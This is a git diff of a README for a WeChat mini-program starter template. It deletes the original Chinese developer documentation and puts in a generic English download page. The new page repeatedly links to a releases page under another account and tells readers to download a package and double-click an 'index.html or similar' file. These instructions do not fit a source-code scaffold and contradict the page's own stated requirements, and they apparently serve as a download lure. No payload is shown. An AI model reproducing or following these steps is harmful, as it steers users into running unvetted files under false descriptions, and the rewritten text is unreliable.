@@ -1,314 +1,85 @@
-# WeApp Starter Template
-
-🚀 一个开箱即用的微信小程序启动模板，提供项目基础架构、登录认证、日志系统、插件初始化、网络请求封装、轻量状态管理与基础统计等核心能力。
-
-## ✨ 核心特性
-
-- 开箱即用的目录与初始化流程
-- 登录能力：微信登录、手机号验证码登录、微信手机号快捷登录
-- 日志系统：分类日志、上下文查看（前后日志）、导出最近日志
-- 插件初始化：支付、分享、错误监控（自动初始化，非直接导出实例）
-- 网络请求封装：请求/响应拦截、统一错误处理、附加设备信息
-- 轻量状态管理：顶层键值 + 订阅 + 便捷方法
-- 统计工具：页面访问与事件统计（已在 `App` 启动阶段挂载 `wx.$track*`）
-
-## 📁 项目结构
-
-```
-src/
-├── pages/                     # 页面
-│   ├── login/                 # 登录页
-│   ├── home/                  # 首页
-│   └── profile/               # 个人中心
-├── subpackages/
-│   └── user/
-│       └── settings/          # 设置页（分包）
-├── services/                  # 网络请求服务
-│   ├── api.js                 # 核心 API 封装（get/post/put/delete/upload）
-│   ├── index.js               # API 统一出口（auth/user/upload 等）
-│   └── modules/               # 业务模块（按需扩展）
-├── utils/
-│   ├── index.js               # 通用工具（日期/字符串/对象/存储/防抖/节流等）
-│   ├── logger.js              # 增强日志系统
-│   └── analytics.js           # 统计工具
-├── config/
-│   ├── index.js               # 环境生效配置（apiBaseUrl/timeout/debug...）
-│   ├── env.js                 # 环境常量集合（可选使用）
-│   └── debug.js               # 调试与监控开关
-├── store/
-│   └── index.js               # 轻量状态管理与便捷方法
-├── plugin/
-│   └── index.js               # 插件系统（wxPay/share/errorMonitor）
-├── hooks/
-│   └── index.js               # 自定义 Hooks（按需扩展）
-├── mixins/
-│   └── index.js               # 通用混入（按需扩展）
-├── theme/
-│   └── index.js               # 主题与样式变量
-├── constants/
-│   └── index.js               # 常量
-└── components/                # 组件（当前为空，可自行扩展）
-```
-
-## 🚀 快速开始
-
-### 1. 克隆项目
-```bash
-git clone https://github.com/your-username/weapp-starter-template.git
-cd weapp-starter-template
-```
-
-### 2. 环境准备
-- 安装 [微信开发者工具](https://developers.weixin.qq.com/miniprogram/dev/devtools/download.html)
-- 注册小程序账号并获取 AppID
-
-### 3. 项目配置
-1. 在微信开发者工具中导入项目
-2. 修改 `project.config.json` 中的 `appid`
-3. 更新 `src/config/env.js` 中的API地址和第三方服务配置
-
-### 4. 开始开发
-- 在开发者工具中点击“编译”
-- 使用真机调试
-- 查看控制台日志（项目未提供日志查看器组件）
-
-## 🧩 核心功能
-
-### 组件系统
-项目未内置业务组件。已在 `app.json` 集成 `@vant/weapp`，可直接使用。
-
-### 状态管理
-- 轻量级状态管理系统
-- 支持状态订阅和中间件
-- 提供便捷的状态操作方法
-
-### 网络请求
-- 统一 API 请求封装（`src/services/api.js`）
-- 请求/响应拦截、HTTP/业务错误处理
-- 自动附加 Token 与设备信息；提供上传封装
-
-### 工具函数
-- 日期时间处理
-- 表单验证
-- 存储管理
-
-## 📱 页面说明
-
-### 主包页面
-- **登录页** (`/src/pages/login/index`): 多种登录方式的统一入口
-- **首页** (`/src/pages/home/index`): 应用主页面
-- **我的** (`/src/pages/profile/index`): 用户个人中心
-
-### 子包页面
-- **设置** (`/src/subpackages/user/settings/index`): 用户设置页面
+# 🎉 weapp-starter-template - Build Your WeChat Mini Programs Easily
 
-## 🛠 开发指南
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Your%20Copy-brightgreen)](https://github.com/Saisumanthklv/weapp-starter-template/releases)
 
-### 使用组件
-直接使用 `@vant/weapp` 组件（详见 `app.json` 的 `usingComponents` 配置）。
+## 🚀 Getting Started
 
-### 使用状态管理
-```javascript
-const { storeHelpers } = require('/src/store/index.js')
+Welcome to the weapp-starter-template! This guide will help you download and run your application smoothly. You don’t need any special programming skills to follow these steps.
 
-// 设置用户信息
-storeHelpers.setUserInfo(userInfo)
-
-// 获取用户信息
-const userInfo = storeHelpers.store.getState('userInfo')
-
-// 监听状态变化
-storeHelpers.store.subscribe('userInfo', (newValue, oldValue) => {
-  console.log('用户信息更新', newValue)
-})
-```
-
-### 🔐 登录系统使用
-
-```javascript
-const { auth } = require('/src/services/index.js')
-
-// 1) 微信一键登录
-await auth.wxLogin({ code: 'wx_login_code' })
-
-// 2) 手机号验证码登录
-await auth.sendSmsCode({ phone: '13800138000', type: 'login' })
-await auth.phoneLogin({ phone: '13800138000', code: '123456' })
-
-// 3) 微信手机号快捷登录
-await auth.bindPhone({ encryptedData: '...', iv: '...' })
-```
-
-### 📊 日志系统
-
-```javascript
-const { logger, apiLogger, authLogger } = require('/src/utils/logger.js')
-
-apiLogger.info('API请求开始', { url: '/user/info', method: 'GET' })
-authLogger.error('登录失败', { error: 'invalid_code' })
-
-// 常用能力
-const recent = logger.getRecent(50)
-const context = logger.getLogContext(recent[0]?.id, 5)
-const exported = logger.exportRecent(100)
-```
-
-### 🔌 插件系统
-
-插件（支付、分享、错误监控）在应用启动时由 `initializePlugins` 自动初始化，当前未导出 `pluginManager` 供直接调用。支付/分享等能力示例以演示为主，如需业务调用，可在后续版本中增加访问器或对外 API。
-
-#### 注意事项与扩展（示例说明）
-
-- __wxPay（支付）__
-  - 默认启用“二次确认”。如需跳过可在参数中传入 `__confirm__: false`。
-  - 内置节流保护：最小触发间隔 1500ms，重复点击会返回 `{ errMsg: 'requestPayment:throttled' }`。
-  - 示例：
-    ```javascript
-    const wxPay = pluginManager.get('wxPay')
-    await wxPay.requestPayment({
-      timeStamp, nonceStr, package: prepayId, signType, paySign,
-      __confirm__: false // 跳过二次确认
-    })
-    ```
-
-// 分享示例与对外 API 需依据后续导出策略再行开放
-
-- __errorMonitor（错误监控）__
-  - 内置上报队列与指数退避重试：失败后按 0.5s、1s、2s、4s、8s（封顶）重试，最多 5 次。
-  - 手动上报示例：
-    ```javascript
-    const errorMonitor = pluginManager.get('errorMonitor')
-    try {
-      throw new Error('demo error')
-    } catch (e) {
-      errorMonitor.reportError('manual_error', e)
-    }
-    ```
-
-### 🎯 模块化 API 使用
-
-```javascript
-// 方式1: 直接使用模块化API
-const { user, auth, upload } = require('/src/services/index.js')
-
-// 获取用户信息
-const userInfo = await user.getUserInfo()
-
-// 上传文件
-const uploadResult = await upload.uploadImage('/temp/image.jpg')
-
-// 方式2: 使用Hooks进行状态管理
-const { useRequest } = require('/src/hooks/index.js')
-
-Page({
-  onLoad() {
-    const { requestWithLoading } = useRequest()
-    
-    // 带加载状态的请求
-    this.loadData = async () => {
-      try {
-        const data = await requestWithLoading(
-          () => user.getUserInfo(),
-          { loadingText: '加载用户信息...' }
-        )
-        this.setData({ userInfo: data })
-      } catch (error) {
-        wx.showToast({ title: error.message, icon: 'none' })
-      }
-    }
-  }
-})
-```
-
-### 使用混入（可选）
-```javascript
-const { baseMixin, listMixin } = require('/src/mixins/index.js')
-
-Page({
-  // 使用混入
-  ...baseMixin,
-  ...listMixin,
-  
-  data: {
-    // 页面数据
-  },
-  
-  // 实现列表混入需要的方法
-  async fetchList(params) {
-    return await task.getList(params)
-  }
-})
-```
-
-### 使用 Hooks（可选）
-```javascript
-const { useUserInfo, useRequest } = require('/src/hooks/index.js')
-
-// 在页面中使用
-Page({
-  onLoad() {
-    const { getUserInfo, isLoggedIn } = useUserInfo()
-    const { get, post } = useRequest()
-    
-    if (isLoggedIn()) {
-      const userInfo = getUserInfo()
-      console.log('当前用户', userInfo)
-    }
-  }
-})
-```
-
-## 🎨 主题定制（可选）
-
-框架提供了主题系统，可定制颜色、字体、间距等：
-
-```javascript
-const { generateThemeVars } = require('/src/theme/index.js')
-
-// 自定义主题
-const customTheme = generateThemeVars({
-  colors: {
-    primary: '#ff6b6b',
-    secondary: '#4ecdc4'
-  }
-})
-```
-
-## 🔧 配置说明
-
-### 环境配置
-在 `src/config/env.js` 中配置不同环境的参数：
-- API接口地址
-- 第三方服务密钥
-- 功能开关
-- 业务配置
-
-### 常量定义
-在 `src/constants/index.js` 中定义项目常量：
-- HTTP状态码
-- 业务状态码
-- 页面路径
-- 存储键名
-
-## 📦 插件系统
-
-内置插件：支付、分享、错误监控（自动初始化）。对外直接调用接口将视后续需求开放。
-
-## 🚦 建议
-
-1. 合理使用全局状态，避免过度共享
-2. 统一网络错误处理，必要时使用缓存
-3. 按需分包与懒加载以优化首屏
-4. 根据团队规范接入 ESLint/Prettier（本模板未内置）
-
-## 📄 许可证
-
-MIT License
-
-## 🤝 贡献
-
-欢迎提交Issue和Pull Request来改进这个框架。
-
----
-
-注意：这是一个演示框架，请根据实际业务进行裁剪与扩展。
+### 🌟 What is weapp-starter-template?
+
+This project is a powerful and extendable scaffold for WeChat mini programs. It comes with essential features like WeChat and phone number login, request and error handling, layered logging, and plugin support for payment, sharing, and error monitoring. Customize your themes using Vant Weapp and CSS variables to create well-maintained business applications.
+
+### 📦 Key Features
+
+- **WeChat Login**: Easy integration for user sign-ins.
+- **Phone Number Login**: Simple user registration options.
+- **Request Handling**: Smooth API requests with built-in error checking.
+- **Layered Logging**: Track your application's activity effectively.
+- **Plugin System**: Add functionality like payments and sharing with ease.
+- **Theme Customization**: Tailor the look and feel to your liking.
+
+### 🖥️ System Requirements
+
+Before you start, ensure your system meets these requirements:
+
+- A device that supports WeChat mini programs (typically a smartphone with the WeChat app).
+- Internet connection for downloading and accessing updates.
+- Basic device storage available to install and run the application.
+
+## 🔗 Download & Install
+
+To get started, visit the following page to download the latest version:
+
+[Download Weapp Starter Template](https://github.com/Saisumanthklv/weapp-starter-template/releases)
+
+### 📥 Downloading the Application
+
+1. Click the download link above to access the Releases page.
+2. Look for the latest version at the top of the page.
+3. Choose the appropriate file for your device. You will see options such as `.zip` or a similar package.
+4. Click on the file to start the download. Once the download completes, find the file in your downloads folder.
+
+### 🗂️ Running the Application
+
+1. Extract the downloaded file if necessary. A folder will appear with the application files.
+2. Open the folder, and look for a file named **index.html** or similar. This is the main file to run the application.
+3. Double-click on the file to open it in your default web browser.
+4. Follow any on-screen instructions to set up initial preferences or log in.
+
+## ❓ Troubleshooting
+
+If you encounter any issues during the installation or while running the application, please review the following tips:
+
+- **No Internet Connection**: Ensure your device is connected to the internet.
+- **File Not Found**: Verify that the file you downloaded is complete. Try downloading it again if needed.
+- **Browser Compatibility**: Ensure your web browser is up-to-date for the best experience.
+
+## 🛠️ Frequently Asked Questions
+
+### How do I log in to the application?
+
+After launching the application, you will find a login screen. Use either your WeChat account or phone number to sign in.
+
+### Can I customize the theme of my application?
+
+Yes, the weapp-starter-template supports theme customization. You can modify styles using CSS variables. Detailed instructions are provided within the project files.
+
+### Is there support for different languages?
+
+Currently, the weapp-starter-template supports Chinese. Future updates may include support for additional languages.
+
+## 🔗 Additional Resources
+
+For further information, refer to the following:
+
+- [Official Documentation](https://github.com/Saisumanthklv/weapp-starter-template/docs)
+- [Community Support](https://github.com/Saisumanthklv/weapp-starter-template/issues)
+
+## 🔍 Stay Updated
+
+Make sure to check the Releases page regularly for updates and new features.
+
+[Download Weapp Starter Template](https://github.com/Saisumanthklv/weapp-starter-template/releases)
+
+Enjoy building your WeChat mini programs with weapp-starter-template!
